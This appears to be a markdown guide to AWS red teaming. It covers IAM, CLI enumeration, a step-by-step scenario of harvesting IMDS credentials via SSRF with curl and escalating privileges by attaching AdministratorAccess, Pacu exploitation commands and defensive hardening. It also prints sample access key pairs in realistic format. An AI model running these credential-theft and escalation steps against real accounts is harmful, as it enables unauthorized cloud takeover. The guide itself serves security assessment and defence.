# AWS Cloud Red Teaming & Security Assessment Guide

<img width="1856" height="576" alt="AWSCloudRedTeaming" src="https://github.com/user-attachments/assets/077b7198-7ef3-4baa-acc8-f084ec6fe9bf" />


A comprehensive technical reference and operational guide for red team operators, penetration testers, and cloud security auditors evaluating AWS environments.

## Table of Contents

1. [AWS Architecture & Key Services](#1-aws-architecture--key-services)

2. [IAM Core Concepts](#2-iam-core-concepts)

3. [AWS Authentication Methods & Credentials](#3-aws-authentication-methods--credentials)

4. [CLI Enumeration Reference](#4-cli-enumeration-reference)

5. [AWS Cloud Red Team Attack Lifecycle](#5-aws-cloud-red-team-attack-lifecycle)

6. [Exploitation Scenario: IMDS Credential Harvesting & PrivEsc](#6-exploitation-scenario-imds-credential-harvesting--privesc)

7. [Automated Security Auditing with Pacu](#7-automated-security-auditing-with-pacu)

8. [Defensive Hardening & Remediation](#8-defensive-hardening--remediation)

## 1. AWS Architecture & Key Services

AWS decouples its infrastructure into two main operational layers:

* **Control Plane:** The management layer through which administrative commands and configuration changes are processed (AWS Management Console, AWS CLI, SDKs/APIs).

* **Data Plane:** The operational layer where customer workloads and data reside (EC2 instances, S3 bucket objects, RDS databases, EBS volumes).

```
+-----------------------------------------------------------------------+
|                              CLOUD SPACE                              |
|                                                                       |
|  +-----------------------+              +--------------------------+  |
|  |   AWS Web Portal      |<------------>|       AWS Services       |  |
|  |        (GUI)          |              |      (Control Plane)     |  |
|  +-----------------------+              +--------------------------+  |
|             ^                                        ^                |
|             |                                        |                |
+-------------|----------------------------------------|----------------+
              |                                        |
       +--------------+                    +-----------------------+
       | Web Browser  |                    |      AWS CLI/SDK      |
       +--------------+                    +-----------------------+
              ^                                        ^
              |                                        |
              +-------------------+--------------------+
                                  |
                              [End User]

```

### Core AWS Service Map

* **Identity & Access:** IAM (Identity & Access Management), AWS IAM Identity Center (SSO).

* **Compute:** EC2 (Elastic Compute Cloud), AWS Lambda (Serverless), ECS/EKS (Containers & Kubernetes).

* **Storage & Databases:** S3 (Simple Storage Service), EBS (Elastic Block Store), RDS (Relational Database Service).

* **Networking:** VPC (Virtual Private Cloud).

* **Security, Monitoring & Logging:** CloudTrail (API Audit Logs), CloudWatch (Metrics & Logging), GuardDuty (Threat Detection).

## 2. IAM Core Concepts

AWS Identity and Access Management (IAM) controls access to AWS resources via fine-grained policy definitions.

### Key Components

1. **Users:** Identities assigned to individual persons or services, configured with long-term credentials (passwords, Access Key pairs).

2. **Groups:** Collections of IAM users. Attaching policies to groups automatically inherits permissions to member users.

3. **Roles:** Identities assumed by trusted entities (services like EC2 or Lambda, federated users, or cross-account principals) for temporary credentials.

4. **Policies:** JSON documents defining permissions using actions, effects, resources, and conditions.

```
                   +------------------+
                   |    IAM Policy    |
                   +------------------+
                     /      |       \
                    /       |        \
                   v        v         v
               +------+ +--------+ +-------+
               | User | | Group  | | Role  |
               +------+ +--------+ +-------+
                                       |
                                       v
                                +---------------+
                                | AWS Services  |
                                +---------------+

```

### Policy Anatomy

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::target-bucket",
        "arn:aws:s3:::target-bucket/*"
      ]
    }
  ]
}

```

* **Effect:** Defines explicit `Allow` or `Deny`.

* **Action:** List of API operations permitted or forbidden (e.g., `ec2:DescribeInstances`, `iam:AttachRolePolicy`).

* **Resource:** The target Amazon Resource Name (ARN) or `*` for all resources.

### Policy Types

* **Inline Policies:** Embedded directly within a single IAM user, group, or role.

* **AWS Managed Policies:** Pre-created policies created and maintained by AWS (e.g., `AdministratorAccess`, `AmazonEC2FullAccess`).

* **Customer Managed Policies:** Standalone managed policies created within an organization's AWS account.

## 3. AWS Authentication Methods & Credentials

Credentials in AWS fall into two primary categories: Long-Term Credentials and Short-Term Credentials.

```
                           +-------------------+
                           |  AWS Credentials  |
                           +-------------------+
                             /               \
                            /                 \
            +--------------------+       +---------------------+
            | Long-Term Credentials |     | Short-Term Credentials|
            +--------------------+       +---------------------+
             /                  \                  |
            v                    v                 v
     [ Console GUI ]     [ CLI / SDK ]       [ CLI / SDK ]
     - Username/Pass     - Access Key ID     - Access Key ID
     - MFA               - Secret Access Key - Secret Access Key
                                             - Session Token

```

### Credential Types

1. **Root User Credentials:** Account creation email + password. Complete, unrestricted administrative control over the entire AWS account.

2. **IAM User Credentials:** Console password + Access Keys (`AKIA...`).

3. **Short-Term Credentials:** Generated via AWS STS (Security Token Service). Identified by access keys starting with `ASIA...` accompanied by a mandatory `AWS_SESSION_TOKEN`.

### Stored AWS Credentials Locations

On local operational endpoints, AWS CLI configuration and key material are saved by default at:

* **Linux / macOS:** `~/.aws/credentials` & `~/.aws/config`

* **Windows:** `C:\Users\<UserName>\.aws\credentials` & `C:\Users\<UserName>\.aws\config`

#### Sample `credentials` File Format

```
[default]
aws_access_key_id = AKIAZVR56YVSAIKSG324
aws_secret_access_key = Vhlb+Y2cc21zkjIq97zU0DeXDWCuhPhGb6TUfODk

[atomic-nuclear]
aws_access_key_id = AKIAUI7PQSNFTCHFHCGR
aws_secret_access_key = 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

```

### AWS CLI Configuration Commands

```
# Set long-term access key profile
aws configure --profile atomic-nuclear

# Verify identity details
aws sts get-caller-identity --profile atomic-nuclear

# Set short-term (STS) credentials via environment variables (Linux/macOS)
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Set short-term credentials on Windows Command Prompt
set AWS_ACCESS_KEY_ID=ASIA...
set AWS_SECRET_ACCESS_KEY=...
set AWS_SESSION_TOKEN=...

```

## 4. CLI Enumeration Reference

Once initial programmatic access is established, systematically enumerate IAM entities and policy attachments.

### User Enumeration

```
# List all IAM users in the account
aws iam list-users

# List groups assigned to a specific user
aws iam list-groups-for-user --user-name <user-name>

# List attached managed policies for a user
aws iam list-attached-user-policies --user-name <user-name>

# List inline policy names for a user
aws iam list-user-policies --user-name <user-name>

# Retrieve specific inline policy document for a user
aws iam get-user-policy --user-name <user-name> --policy-name <policy-name>

```

### Group Enumeration

```
# List all IAM groups
aws iam list-groups

# Retrieve details and members of a group
aws iam get-group --group-name <group-name>

# List attached managed policies for a group
aws iam list-attached-group-policies --group-name <group-name>

# List inline policies embedded in a group
aws iam list-group-policies --group-name <group-name>

# Retrieve inline policy content for a group
aws iam get-group-policy --group-name <group-name> --policy-name <policy-name>

```

### Role Enumeration

```
# List all IAM roles
aws iam list-roles

# List attached managed policies for a role
aws iam list-attached-role-policies --role-name <role-name>

# List inline policy names embedded in a role
aws iam list-role-policies --role-name <role-name>

# Retrieve inline policy content for a role
aws iam get-role-policy --role-name <role-name> --policy-name <policy-name>

```

### Policy Enumeration

```
# List customer managed policies
aws iam list-policies --scope Local

# Get metadata for a managed policy
aws iam get-policy --policy-arn <policy-arn>

# List policy versions
aws iam list-policy-versions --policy-arn <policy-arn>

# Retrieve default/specific policy version JSON document
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>

```

## 5. AWS Cloud Red Team Attack Lifecycle

Cloud Red Teaming follows an iterative execution lifecycle aligned with MITRE ATT&CK for Cloud:

```
+-------+     +-------------------+     +-----------------------+     +--------------------+
| Recon | --> | Initial          | --> | Establish             | --> | Internal           |
|       |     | Compromise        |     | Persistence           |     | Enumeration        |
+-------+     +-------------------+     +-----------------------+     +--------------------+
                                                                                |
                                                                                v
+-----------------+     +-------------------+     +--------------------+     +--------------------+
| Complete Ops /  | <-- | Data Exfiltration | <-- | Privilege          | <-- | Credential Access  |
| Impact          |     |                   |     | Escalation         |     | / Lateral Movement |
+-----------------+     +-------------------+     +--------------------+     +--------------------+

```

1. **Reconnaissance:** OSINT, exposing public S3 buckets, exposed code repositories, public API endpoints.

2. **Initial Compromise:** Exploiting vulnerable web applications (SSRF, RCE), leaked access keys, or credential stuffing on portal interfaces.

3. **Internal Enumeration:** Enumerating IAM permissions, running instances, storage objects, and network setup.

4. **Credential Access:** Stealing credentials from instance metadata services (IMDS), environment variables, or config files.

5. **Privilege Escalation:** Exploiting misconfigured IAM policies (e.g., `iam:AttachRolePolicy`, `iam:CreatePolicyVersion`, `iam:PassRole`).

6. **Lateral Movement & Persistence:** Pivot across accounts or services using assumed roles, persistent access keys, or modified trust relationships.

7. **Data Exfiltration & Impact:** Downloading sensitive data from S3, EBS snapshots, RDS instances, or disrupting operations.

## 6. Exploitation Scenario: IMDS Credential Harvesting & PrivEsc

### Phase 1: Environment Discovery with Initial Profile

```
# Configure initial compromised identity
aws configure --profile auditor

# Enumerate running EC2 instances
aws ec2 describe-instances --profile auditor

```

### Phase 2: Exploiting Web Vulnerabilities (SSRF / RCE) to Query IMDS

If an application running on an EC2 instance is vulnerable to SSRF (Server-Side Request Forgery) or RCE, query the Instance Metadata Service (IMDSv1) at address `169.254.169.254`.

```
# Fetch attached role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Fetch temporary credentials for the attached role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/jump-ec2-role

```

*Response Output:*

```
{
  "Code": "Success",
  "LastUpdated": "2026-10-17T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-10-17T06:00:00Z"
}

```

### Phase 3: Setting the Harvested Credentials in AWS CLI

```
aws configure set aws_access_key_id "ASIA..." --profile ec2
aws configure set aws_secret_access_key "..." --profile ec2
aws configure set aws_session_token "..." --profile ec2

# Verify assumed role identity
aws sts get-caller-identity --profile ec2

```

### Phase 4: Enumerating Role Permissions

```
# List attached managed policies
aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor

# List inline policies
aws iam list-role-policies --role-name jump-ec2-role --profile auditor

# Read inline policy document
aws iam get-role-policy --role-name jump-ec2-role --policy-name jump-inline-policy --profile auditor

```

### Phase 5: Privilege Escalation via Policy Attachment

If the role possesses permissions such as `iam:AttachRolePolicy` or wildcard IAM privileges:

```
# Attach AdministratorAccess policy directly to the current role
aws iam attach-role-policy \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --role-name jump-ec2-role \
  --profile ec2

# Verify policy attachment
aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor

```

## 7. Automated Security Auditing with Pacu

[Pacu](https://github.com/RhinoSecurityLabs/pacu) is an open-source AWS exploitation framework designed for assessing cloud environments.

### Key Pacu Commands & Workflow

```
# Launch Pacu console
python3 pacu.py

# Import target access keys into Pacu
Pacu (new:session) > set_keys

# Enumerate permissions of the current key set
Pacu (new:session) > exec iam__enum_permissions
Pacu (new:session) > whoami

# Enumerate EC2 instances and retrieve public IPs
Pacu (new:session) > exec ec2__enum
Pacu (new:session) > data EC2

# Import temporary credentials acquired from IMDS
Pacu (new:session) > set_keys

# Scan for privilege escalation vectors
Pacu (new:session) > exec iam__privesc_scan

# Re-evaluate permissions post-escalation
Pacu (new:session) > exec iam__enum_permissions
Pacu (new:session) > whoami

```

## 8. Defensive Hardening & Remediation

To prevent and mitigate the exploitation paths outlined above, implement the following security controls:

### 1. Enforce IMDSv2 Across All EC2 Instances

Require session-oriented token requests to mitigate SSRF vectors targeting `169.254.169.254`.

```
aws ec2 modify-instance-metadata-options \
  --instance-id <instance-id> \
  --http-tokens required \
  --http-endpoint enabled

```

### 2. Implement the Principle of Least Privilege (PoLP)

* Do not attach wildcard policies (`*`) or `AdministratorAccess` to service roles.

* Restrict administrative IAM actions (`iam:AttachRolePolicy`, `iam:PutRolePolicy`, `iam:CreatePolicyVersion`, `iam:PassRole`) using explicit conditions and permission boundaries.

### 3. Monitoring & Threat Detection

* **AWS CloudTrail:** Enable global multi-region logging and log validation.

* **Amazon GuardDuty:** Monitor for anomalous API calls, unauthenticated requests, or credentials used outside the environment (e.g., instance credentials used from an external IP).

* **Alerting Rules:** Trigger high-priority alerts on critical security events (e.g., `AttachRolePolicy`, `CreateAccessKey`, or disabling of CloudTrail).
